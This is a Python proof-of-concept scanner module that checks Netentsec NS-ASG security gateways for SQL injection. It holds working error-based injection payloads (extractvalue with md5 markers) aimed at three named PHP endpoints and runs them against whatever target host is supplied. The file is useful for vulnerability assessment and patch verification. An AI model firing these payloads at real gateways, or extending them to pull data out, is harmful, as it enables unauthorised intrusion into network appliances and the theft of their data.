# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Netentsec_0005'  # 平台漏洞编号，留空
    name = '网康NS-ASG 应用安全网关SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-04-30'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关多处SQL注入漏洞：
        /WebPages/history.php?uid=1
        /WebPages/applyhardware.php?action=
        /WebPages/singlelogin.php?loginId=1
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '537b9b89-711c-4e36-aad4-5158d302edc1'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2014-058932
            # refer: http://www.wooyun.org/bugs/wooyun-2014-058971
            # refer: http://www.wooyun.org/bugs/wooyun-2014-058988
            # refer: http://www.wooyun.org/bugs/wooyun-2014-077810
            hh = hackhttp.hackhttp()
            arg = self.target
            # 报错注入
            payloads = [
                arg +
                '/WebPages/history.php?uid=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))',
                arg +
                '/WebPages/applyhardware.php?action=applyhardware&hard_user=test%2527%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))%23',
                arg +
                '/WebPages/singlelogin.php?loginId=1%20and%20extractvalue(0x1,concat(0x23,(select%20md5(1))))%23&submit=t',
            ]
            md5_1 = 'c4ca4238a0b923820dcc509a6f75849'
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)

                if code == 200 and md5_1 in res:
                    #security_hole('SQL injection: ' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
